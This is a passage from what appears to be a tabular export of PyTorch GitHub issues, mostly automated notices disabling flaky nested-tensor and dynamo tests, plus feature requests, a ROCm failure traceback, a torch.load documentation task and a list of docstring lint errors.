DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_dropout_backward_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_backward_sub_strided_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_backward_sub_strided_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18066521053).

Over the past 3 hours, it has been determined flaky in 8 workflow(s) with 24 failures and 8 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_backward_sub_strided_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_backward_for_sub_op_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_backward_for_sub_op_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18056138415).

Over the past 3 hours, it has been determined flaky in 9 workflow(s) with 27 failures and 9 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_backward_for_sub_op_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_backward_for_add_op_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_backward_for_add_op_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18046641341).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_backward_for_add_op_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
Add an option to `torch.nn.GRU` to use other activations than `tanh` ,"### üöÄ The feature, motivation and pitch

As of today, `torch.nn.GRU` is  using `tanh`

https://github.com/pytorch/pytorch/blob/main/aten/src/ATen/native/cuda/RNN.cu#L252

Some users request to be able to use other activations like SELU, PRELU, ...

TensorFlow/Keras has an option to choose the activation to use:
https://www.tensorflow.org/api_docs/python/tf/keras/layers/GRU

However, cuDNN GRU is also limited to `tanh` so we will need to fallback to our implementation if user is requesting an alternative activation.

### Alternatives

_No response_

### Additional context

_No response_",False
DISABLED test_backward_add_strided_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_backward_add_strided_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18024258928).

Over the past 3 hours, it has been determined flaky in 5 workflow(s) with 15 failures and 5 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_backward_add_strided_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_as_nested_tensor_propagates_gradients_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_as_nested_tensor_propagates_gradients_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18019701994).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 9 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_as_nested_tensor_propagates_gradients_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_accumulate_grad_different_strides_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_accumulate_grad_different_strides_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18008909931).

Over the past 3 hours, it has been determined flaky in 9 workflow(s) with 27 failures and 9 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_accumulate_grad_different_strides_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_complex_half_reference_testing_nn_functional_conv_transpose3d_cuda_complex32 (__main__.TestCommonCUDA) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/6557415708/job/17809641044

```
======================================================================
FAIL: test_complex_half_reference_testing_nn_functional_conv_transpose3d_cuda_complex32 (__main__.TestCommonCUDA)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/opt/conda/envs/py_3.8/lib/python3.8/site-packages/torch/testing/_internal/common_utils.py"", line 2453, in wrapper
    method(*args, **kwargs)
  File ""/opt/conda/envs/py_3.8/lib/python3.8/site-packages/torch/testing/_internal/common_utils.py"", line 2453, in wrapper
    method(*args, **kwargs)
  File ""/opt/conda/envs/py_3.8/lib/python3.8/site-packages/torch/testing/_internal/common_device_type.py"", line 415, in instantiated_test
    result = test(self, **param_kwargs)
  File ""/opt/conda/envs/py_3.8/lib/python3.8/site-packages/torch/testing/_internal/common_device_type.py"", line 908, in test_wrapper
    return test(*args, **kwargs)
  File ""test_ops.py"", line 1222, in test_complex_half_reference_testing
    self.assertEqual(actual, expected, exact_dtype=False)
  File ""/opt/conda/envs/py_3.8/lib/python3.8/site-packages/torch/testing/_internal/common_utils.py"", line 3356, in assertEqual
    raise error_metas.pop()[0].to_error(
AssertionError: Tensor-likes are not close!

Mismatched elements: 1 / 1120 (0.1%)
Greatest absolute difference: 0.5810546875 at index (0, 0, 4, 1, 2) (up to 0.09 allowed)
Greatest relative difference: 0.1502685546875 at index (0, 0, 4, 1, 2) (up to 0.09 allowed)

To execute this test, run the following from the base repo dir:
    PYTORCH_TEST_WITH_ROCM=1 python test_ops.py -k test_complex_half_reference_testing_nn_functional_conv_transpose3d_cuda_complex32
```

cc @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False
[dynamo] `CondHigherOrderVariable` should handle kwargs by flattening to args triaged oncall: pt2 module: higher order operators,"### üöÄ The feature, motivation and pitch

Currently, I believe it is not flattened. We throw an error if len(args) != 4

However, users may do something like the following:

```python
torch.cond(pred=True, true_fn=lambda x: x +1, false_fn=lambda x: x - 1, operands=(torch.tensor([0]),))
```
Causing a graph break when it could have been trivially traced within dynamo


cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
Pruning/Compressing heads in attention blocks ,"### üöÄ The feature, motivation and pitch

I've a conceptual question

BERT-base has a dimension of 768 for query, key and value and 12 heads (Hidden dimension=768, number of heads=12). The same is conveyed if we see the BERT-base architecture

```
(self): BertSelfAttention(
              (query): Linear(in_features=768, out_features=768, bias=True)
              (key): Linear(in_features=768, out_features=768, bias=True)
              (value): Linear(in_features=768, out_features=768, bias=True)
              (dropout): Dropout(p=0.1, inplace=False)
)
```
Now, my question is:

Can I consider the first 64 neurons from the _out_features_ as the first-head, the next 64 neurons from the _out_features_ as the 2nd head and so on? (sec 3.2.2 from original paper; [Link](https://papers.nips.cc/paper/2017/file/3f5ee243547dee91fbd053c1c4a845aa-Paper.pdf))

Basically, I am wondering if the Linear module representing query matrix; which is 768x768 can be thought as (768x64), (768x64)...12 times? The same for key and value modules

If so, is it possible to provide some starter code as I am unable to wrap around my head. Any help is appreciated (and I've some sample in the contribution section)

**P.S:** Here's the issue from StackOverflow ([link](https://datascience.stackexchange.com/questions/124233/understanding-multi-headed-attention-from-architecture-details))

### Alternatives

Example applications include papers from academia such as - [Paper1](https://lena-voita.github.io/posts/acl19_heads.html), [Paper2](https://github.com/pmichel31415/are-16-heads-really-better-than-1)

I referred to some of the previous posts ([link](https://datascience.stackexchange.com/questions/88330/how-do-the-linear-layers-in-the-attention-mechanism-work)), but I would appreciate any validation on this thought-process as it's similar but not same.

### Additional context

Here's a code which prunes a particular % in particular layer depending on _layer_index_ and _prune_percentage_
```
model = AutoModelForMaskedLM.from_pretrained(checkpoint)
linear_layers_list = []
for name, layer in model.named_modules():
    if name in model_layers_list:
        linear_layers_list.append(layer)
print(f""No of linear layers are: {len(linear_layers_list)}"")

layer = linear_layers_list[layer_index]
if prune_type == 'ln_structured':
    # Ln structured with n=1 i.e L1 pruning
    prune.ln_structured(layer, name='weight', amount=prune_percentage, dim=0, n=n)
```
I can understand that I can basically pass the Linear module and prune x% of weights.

Now, I would like to prune/remove one head in a similar fashion.

P.S: Raised a request in Huggingface as well, happy to close both ([Issue link](https://github.com/huggingface/transformers/issues/27044))
Thanks
```[tasklist]
### Tasks
```
",False
DISABLED test_abs_backward_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_abs_backward_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17999233694).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_abs_backward_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
vector loss autograd computation triaged module: vmap,"### üöÄ The feature, motivation and pitch

Hi, the default torch autograd only supports scalar loss, but if we need to compute vectorized loss, e.g., losses = [loss1, loss2, ... lossn], wrt. to weights, how to achieve this function efficiently without loop? Our current workaround is looping through all loss, 

grad_vectors = []
for l in losses:
    grad = torch.autograd.grad(l, self.weight, retain_graph=True)[0]
    grad_vectors.append(grad)


### Alternatives

_No response_

### Additional context

_No response_

cc @zou3519",False
DISABLED test_nested_tensor_sum_dim_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_sum_dim_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17987305754).

Over the past 3 hours, it has been determined flaky in 8 workflow(s) with 24 failures and 8 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_sum_dim_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_nested_tensor_indexing_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_indexing_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17979964194).

Over the past 3 hours, it has been determined flaky in 7 workflow(s) with 21 failures and 7 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_indexing_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_forward_ad_linalg_lu_factor_cuda_float32 (__main__.TestCompositeComplianceCUDA) triaged module: flaky-tests skipped module: unknown,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_forward_ad_linalg_lu_factor_cuda_float32&suite=TestCompositeComplianceCUDA) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17981993578).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 3 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_forward_ad_linalg_lu_factor_cuda_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_ops.py`",False
DISABLED test_forward_ad_stft_cuda_float32 (__main__.TestCompositeComplianceCUDA) triaged module: flaky-tests skipped module: unknown,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_forward_ad_stft_cuda_float32&suite=TestCompositeComplianceCUDA) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17979958785).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_forward_ad_stft_cuda_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_ops.py`",False
Update torch.load examples to encourage best security practices module: docs triaged medium topic: docs docathon-h2-2023,"`torch.load` without setting `weights_only` is unsafe.
See https://github.com/pytorch/pytorch/issues/111806 and linked items there for some discussion.

This task is to update examples at https://pytorch.org/docs/stable/generated/torch.load.html to use `weights_only=True` where possible, and explicit `weights_only=False` with a comment about unsafety only where needed (you need to verify if `weights_only=True` works for a particular example).

cc @svekars @carljparker",False
DISABLED test_nested_tensor_indexing_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_indexing_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17974582867).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 9 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_indexing_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_cond_side_effects (__main__.MiscTests) triaged module: flaky-tests skipped module: dynamo,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_cond_side_effects&suite=MiscTests) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17973670342).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_cond_side_effects`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `dynamo/test_misc.py`

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False
"Fix docstring errors in _VF.py, __config__.py, _lobpcg.py, random.py, _linalg_utils.py, _namedtensor_internals.py, torch_version.py, __future__.py, _classes.py, _sources.py, _lowrank.py, _vmap_internals.py, _storage_docs.py, quasirandom.py, _appdirs.py module: docs triaged medium","- **File**: `torch/__config__.py`, **Line**: 5, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/__config__.py`, **Line**: 5, **Description**: First line should end with a period (not 'e')
- **File**: `torch/__config__.py`, **Line**: 16, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/__config__.py`, **Line**: 21, **Description**: First line should end with a period (not 's')
- **File**: `torch/__config__.py`, **Line**: 21, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/__future__.py`, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/__future__.py`, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/_appdirs.py`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_appdirs.py`, **Line**: 8, **Description**: First line should end with a period (not 'm')
- **File**: `torch/_appdirs.py`, **Line**: 501, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_appdirs.py`, **Line**: 501, **Description**: First line should end with a period (not 'e')
- **File**: `torch/_appdirs.py`, **Line**: 501, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/_lowrank.py`, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/_lowrank.py`, **Line**: 17, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lowrank.py`, **Line**: 17, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lowrank.py`, **Line**: 17, **Description**: First line should end with a period (not 'h')
- **File**: `torch/_lowrank.py`, **Line**: 90, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lowrank.py`, **Line**: 90, **Description**: First line should end with a period (not ',')
- **File**: `torch/_lowrank.py`, **Line**: 194, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lowrank.py`, **Line**: 194, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lowrank.py`, **Line**: 194, **Description**: First line should end with a period (not 'k')
- **File**: `torch/_lowrank.py`, **Line**: 194, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/_lowrank.py`, **Line**: 194, **Description**: No blank lines allowed between a section header and its content ('Args')
- **File**: `torch/_storage_docs.py`, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/torch_version.py`, **Line**: 7, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/torch_version.py`, **Line**: 7, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/torch_version.py`, **Line**: 7, **Description**: First line should end with a period (not 'n')
- **File**: `torch/torch_version.py`, **Line**: 42, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/torch_version.py`, **Line**: 42, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/torch_version.py`, **Line**: 42, **Description**: First line should end with a period (not '!')
- **File**: `torch/_VF.py`, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_VF.py`, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/_classes.py`, **Line**: 34, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **File**: `torch/_linalg_utils.py`, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/_linalg_utils.py`, **Line**: 12, **Description**: First line should end with a period (not 'r')
- **File**: `torch/_lobpcg.py`, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/_lobpcg.py`, **Line**: 75, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lobpcg.py`, **Line**: 75, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/_lobpcg.py`, **Line**: 106, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lobpcg.py`, **Line**: 106, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lobpcg.py`, **Line**: 106, **Description**: First line should be in imperative mood (perhaps 'Evaluate', not 'Evaluates')
- **File**: `torch/_lobpcg.py`, **Line**: 126, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lobpcg.py`, **Line**: 126, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lobpcg.py`, **Line**: 126, **Description**: First line should be in imperative mood (perhaps 'Evaluate', not 'Evaluates')
- **File**: `torch/_lobpcg.py`, **Line**: 362, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/_lobpcg.py`, **Line**: 362, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lobpcg.py`, **Line**: 362, **Description**: First line should end with a period (not 'g')
- **File**: `torch/_lobpcg.py`, **Line**: 362, **Description**: No blank lines allowed between a section header and its content ('Returns')
- **File**: `torch/_lobpcg.py`, **Line**: 362, **Description**: No blank lines allowed between a section header and its content ('References')
- **File**: `torch/_lobpcg.py`, **Line**: 776, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lobpcg.py`, **Line**: 776, **Description**: First line should end with a period (not 'e')
- **File**: `torch/_lobpcg.py`, **Line**: 851, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/_lobpcg.py`, **Line**: 894, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/_lobpcg.py`, **Line**: 945, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_lobpcg.py`, **Line**: 945, **Description**: First line should end with a period (not 'z')
- **File**: `torch/_lobpcg.py`, **Line**: 1003, **Description**: No blank lines allowed between a section header and its content ('Returns')
- **File**: `torch/_lobpcg.py`, **Line**: 1064, **Description**: No blank lines allowed between a section header and its content ('Returns')
- **File**: `torch/_namedtensor_internals.py`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_namedtensor_internals.py`, **Line**: 19, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/_namedtensor_internals.py`, **Line**: 19, **Description**: First line should end with a period (not 'd')
- **File**: `torch/_namedtensor_internals.py`, **Line**: 19, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/_namedtensor_internals.py`, **Line**: 75, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/_namedtensor_internals.py`, **Line**: 75, **Description**: First line should be in imperative mood (perhaps 'Expand', not 'Expands')
- **File**: `torch/_namedtensor_internals.py`, **Line**: 116, **Description**: First line should end with a period (not '
- **File**: `torch/_sources.py`, **Line**: 15, **Description**: First line should be in imperative mood; try rephrasing (found 'Wrapper')
- **File**: `torch/_sources.py`, **Line**: 38, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/_sources.py`, **Line**: 38, **Description**: Use r"""""" if any backslashes in a docstring
- **File**: `torch/_sources.py`, **Line**: 38, **Description**: First line should end with a period (not 'e')
- **File**: `torch/_sources.py`, **Line**: 38, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/_vmap_internals.py`, **Line**: 194, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/quasirandom.py`, **Line**: 6, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/quasirandom.py`, **Line**: 6, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/quasirandom.py`, **Line**: 6, **Description**: First line should end with a period (not 'g')
- **File**: `torch/quasirandom.py`, **Line**: 73, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/quasirandom.py`, **Line**: 73, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/quasirandom.py`, **Line**: 109, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/quasirandom.py`, **Line**: 109, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/quasirandom.py`, **Line**: 133, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/quasirandom.py`, **Line**: 133, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/quasirandom.py`, **Line**: 141, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/quasirandom.py`, **Line**: 141, **Description**: First line should end with a period (not 'y')
- **File**: `torch/quasirandom.py`, **Line**: 141, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **File**: `torch/random.py`, **Line**: 10, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')

cc @carljparker",False
DISABLED test_nested_tensor_indexing_cpu_float16 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_indexing_cpu_float16&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17964762574).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_indexing_cpu_float16`
